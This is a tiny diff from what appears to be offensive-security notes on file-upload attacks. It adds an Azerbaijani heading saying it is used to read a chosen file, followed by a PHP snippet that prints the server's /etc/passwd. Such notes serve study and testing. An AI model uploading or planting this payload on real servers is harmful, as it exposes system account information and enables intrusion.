@@ -1,1 +1,6 @@
-File upload
+## Istədiyimiz faylı oxumaq üçün istifadə olunur 
+
+<?php
+echo file_get_contents('/etc/passwd');
+?>
+
